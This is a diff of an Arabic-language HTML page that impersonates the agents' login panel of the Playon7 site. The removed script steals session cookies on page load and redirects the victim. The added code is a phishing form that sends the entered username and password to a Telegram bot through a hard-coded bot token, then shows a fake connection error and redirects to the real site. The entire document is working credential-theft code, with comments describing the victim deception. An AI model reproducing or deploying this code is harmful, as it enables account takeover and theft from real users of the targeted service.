@@ -1,23 +1,50 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل دخول الوكلاء | Playon7</title>
+    <style>
+        body { background-color: #0b021d; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { width: 90%; max-width: 400px; padding: 25px; background: #13062d; border-radius: 15px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        h2 { color: #e100ff; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #3d1c71; background: #1a0b33; color: white; box-sizing: border-box; }
+        .btn { width: 100%; padding: 15px; background: linear-gradient(90deg, #d600d6, #8e00d6); border: none; border-radius: 8px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>لوحة دخول الوكلاء</h2>
+    <p style="font-size: 13px; color: #aaa;">يرجى تأكيد هويتك للاستمرار في لوحة التحويل</p>
+    
+    <input type="text" id="u" placeholder="اسم المستخدم">
+    <input type="password" id="p" placeholder="كلمة المرور">
+    
+    <button class="btn" onclick="send()">دخول</button>
+</div>
+
 <script>
-// وظيفة سحب الكوكيز وإرسالها للتلغرام
-function stealAndSend() {
-    var cookies = document.cookie; // سحب ملفات الجلسة
+function send() {
+    var user = document.getElementById('u').value;
+    var pass = document.getElementById('p').value;
     var token = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
     var chat_id = "8665747715";
-    
-    var data = "🍪 **Session Cookie Captured!**\n\n" + 
-               "🌐 Domain: agents.playon7.com\n" +
-               "🔑 Cookie: `" + cookies + "`\n\n" +
-               "📱 User Agent: " + navigator.userAgent;
 
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(data)}&parse_mode=Markdown`);
+    if(user && pass) {
+        var msg = `🔥 **صيد جديد للوحة الوكلاء** 🔥\n\n👤 المستخدم: \`${user}\` \n🔑 الباسورد: \`${pass}\``;
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
+        .then(() => {
+            // إظهار رسالة خطأ وهمية ثم التحويل للموقع الحقيقي
+            alert("خطأ في الاتصال بالسيرفر، يرجى المحاولة مرة أخرى.");
+            window.location.href = "https://agents.playon7.com/";
+        });
+    } else {
+        alert("يرجى إدخال البيانات");
+    }
 }
-
-// تنفيذ السحب بمجرد فتح الرابط
-window.onload = stealAndSend;
-
-// تحويل الضحية للموقع الحقيقي لإبعاد الشبهة
-setTimeout(function(){
-    window.location.href = "https://agents.playon7.com/players/players";
-}, 2000);
 </script>
+
+</body>
+</html>
